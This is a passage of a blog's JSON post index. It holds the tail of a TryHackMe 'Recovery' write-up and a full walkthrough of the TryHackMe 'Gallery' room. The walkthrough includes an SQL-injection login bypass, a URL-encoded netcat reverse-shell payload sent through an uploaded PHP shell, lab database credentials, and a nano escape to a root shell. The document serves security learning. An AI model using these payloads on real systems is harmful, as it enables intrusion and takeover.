script.py, I observed that it is a simple calculator. As I can change the environment of root user, let’s make our own python library and add it to the &quot;PATH&quot; variable for execution. Let’s change directory to &quot;/tmp&quot; . As os library is called first, so let’s craft it.Finally for Mistake-2 challenge was capturedVoila I successfully rooted the challenge by using library hijacking for privilege escalation to root.— — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — —Thank you so much everyone for reading this blog till the end.Peace !!!— — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — —References :-GitHub - sqlmapproject/sqlmap: Automatic SQL injection and database takeover tooldvna/a9-using-components-with-known-vulnerability.md at master · appsecco/dvnaHow we exploited a remote execution vulnerability in math.jsCTFtime.org / HackIT CTF 2018 / Believer Case / WriteupCTFtime.org / TokyoWesterns CTF 4th 2018 / Shrine / WriteupSSTI (Server Side Template Injection)https://jinja.palletsprojects.com/en/2.11.x/api/#exceptionsSad Detail · GitLabCyberChefhttps://tryhackme.com/room/recoveryGitHub - Bornunique911/THM-Recoveryrbash shell esacpingLinux Privilege Escalation: Python Library Hijacking - Hacking Articles"
  },
  
  {
    "title": "Gallery - TryHackMe Write-up",
    "url": "/posts/gallery-tryhackme-write-up/",
    "categories": "TryHackMe",
    "tags": "tryhackme-walkthrough, tryhackme, cybersecurity",
    "date": "2022-03-07 00:00:00 +0530",
    





    
    "snippet": "TryHackMe : GalleryHello everyone, I hope you all are doing great. This is my first blog of any TryHackMe room walk-through. So, let’s get started. So I am gonna start with a TryHackMe room called ...",
    "content": "TryHackMe : GalleryHello everyone, I hope you all are doing great. This is my first blog of any TryHackMe room walk-through. So, let’s get started. So I am gonna start with a TryHackMe room called Gallery created by Mika today which includes the following sub-categories in the room :Sub-categories of the roomRoom Link :- https://tryhackme.com/room/gallery666My Profile :- https://tryhackme.com/p/Bornunique911My socials :-Twitter :- https://twitter.com/Bornunique911— — — — — — — — — — — — — — — — — — — — — — — — — — — — — — -P0rt Sc4nn1ng :-Let’s deploy our machine and run Nmap to find open ports and services which are running on them and which we will be enumerating after the Nmap scan is completely done.Nmap scan resultsAs we can observe from the nmap scan results that they are two ports open which are Port 80 and Port 8080. Let’s enumerate the ports one by one.P0rt 80As always it is a default Apache page. Nothing interesting here. Let’s move on to Port 8080.P0rt 8080When we visit to port 8080, it redirects the page to http://10.10.231.162/gallery/login.php which is a simple login page hosted on some CMS(Content Management System). So the CMS used here can be guessed by the title of the page.So the CMS used here is Simple Image Gallery . So let’s do a quick google search for the available exploits for that particular CMS. So we get some nice results while googling :Google Search results for Simple Image Gallery CMSSo let’s check the links one by one and we get some interesting information from two exploit-db links that the simple image gallery CMS is vulnerable to SQL Injection and Remote Code Execution without authentication . The exploit-db links is as under :-https://www.exploit-db.com/exploits/50198Offensive Security&#39;s Exploit Database ArchiveSo from the above two links, the best link which suits here is the Remote Code Execution with an unauthenticated bypass as we are not logged in yet. So let’s see the source code of the exploit.RCE Unauthenticated ExploitSo the source code is written in python, so basically by looking at the source code we can bypass the login page without logging in and we can perform remote code execution by visiting the shell URL. Here we have two options whether to login manually with the credentials mentioned in the source code of the exploit or we can just run the exploit by specifying the target URL and visit the Shell URL.Option 1 : Login Manually by the credentials provided in the source code :-Credentials to the login pageOption 2 : By running the exploit by specifying the TARGET and visiting the Shell URL :-Running exploit by specifying the TARGETSo I will proceed with option 1 which is logging in manually by using the following credentials :-Username :- admin&#39; or &#39;1&#39;=&#39;1&#39;#Password :- Leaving Blank  So we are logged in successfully. So let’s move further.RC3So far RCE exploit is concerned we need to upload a reverse shell to get a shell on our machine. So I downloaded the exploit into my local machine and I ran it. So I got the following as output :-Output after running the exploit locallyLet’s visit the Shell URL now, we get following output :Remote code ExecutionG3tt1ng Sh3llNow as we confirmed that there is a remote code execution we will upload a reverse shell now. But as per my experience uploading reverse shell as plain text will fail so I will upload the reverse shell by encoding the URL as under :-http://10.10.232.246/gallery/uploads/1646679480_TagokobxhhagrwqkzviLetta.php?cmd=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|sh+-i+2&gt;%261|nc+MACHINE-IP+PORT+&gt;/tmp/fNow let’s setup a netcat listener on our terminal to get a shell by triggering the above URL. Boom we got a shell as www-data.Shell as a www-data userLet’s now stabilize the sh shell to the bash shell, by the following command :python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;Now that our shell is upgraded to bash shell, we can export the TERM to screen as a normal terminal screen. But still the shell is not completely stabilized so for that we used the following commands to stabilize perfectly:CTRL + Zstty raw -echo;fg ENTER x2So, the shell is stabilized perfectly.Let’s move further.F1nd1ng Th3 H4sh P4ssw0rd 0f th3 4dm1n (_)s3r :While enumerating the file system I found that there is a initialize.php file in the /var/www/html/gallery directory. Let’s have a look inside the file and there we found some mysql creds which can be useful to us for enumerating the users if there is any users stored in the database.mysql credsLet’s connect with those creds to mysql database.mysql -u gallery_user -pEnter password: passw0rd321Successful login to the databaseCool, we got the access successfully to the database. Now let’s enumerate the databases by following command :show databases;MySQL DatabasesAs per the above screenshot, we have two databases. Among them, gallery_db seems to be interesting. So let’s use it.use gallery_db;Database changed to gallery_dbLet’s explore the tables for the particular database.show tables;Tables for a database gallery_dbThere are four tables in the database gallery_db. Among them, users table seems to be interesting and maybe there should be some juicy information inside the table. Let’s enumerate the table users :select * from users;Hash Password of the admin userFinally we got the hash password for the admin user by connecting to mysql database.3sc4l4t10n T0 M1k3 (_)s3rOkay now let’s try to escalate m1k3 user and find our user flag. Let’s enumerate the file system again, so after some enumeration I found some interesting directory name “mike_home_backup” in /var/backups path. Looks like it’s a backup directory for user m1k3’s home directory.Screenshot of Mike’s home directory stored as a backup in /var/backups directorySo there’s nothing inside in documents. Now, let’s check bash_history maybe there is something interesting inside. Guess what we found the password for the user m1k3 .Password for user MikeLet’s switch to user Mike, by using the password found.(_)s3r Fl4gUser flagCool, we have a user flag now. Let’s move further for privilege escalation to root.Pr1v1l3g3 3sc4l4t10n T0 R00tWe can see that M1k3 user can run a script using a sudo and as the root user:Let’s see the contents of rootkit.sh :Contents of rootkit.shOkay after looking at the contents of rootkit.sh, we have four choices which is versioncheck, update, list and read. Now from the available choices, the last one seems to be interesting as we can run nano as root. Time for a quick look at gtfobins . As per the gtfobins, we can use nano to get privilege to root.Privilege escalation via nano commandLet’s execute the commands as mentioned.Choosing option read because it uses nano command to read the report.txtAfter choosing the read option and hitting enter we are in the nano text editor.Entered in nano text editor after choosing read optionNow by following the commands as per gtfobins, we need to press CTRL R followed by CTRL X to execute the command and execute the following to get a root shell.reset; sh 1&gt;&amp;0 2&gt;&amp;0Executing the command as per gtfobinsBoom we are root.After executing the command we got a root shellNow we can read root.txt file by changing directory to root directory.Root flagThat’s it for the room.We are done with TryHackMe’s Gallery room.Thanks for reading. Peace !!!Gallery - TryHackMe Write-up was originally published in System Weakness on Medium, where people are continuing the conversation by highlighting and responding to this story."
  }
  
]

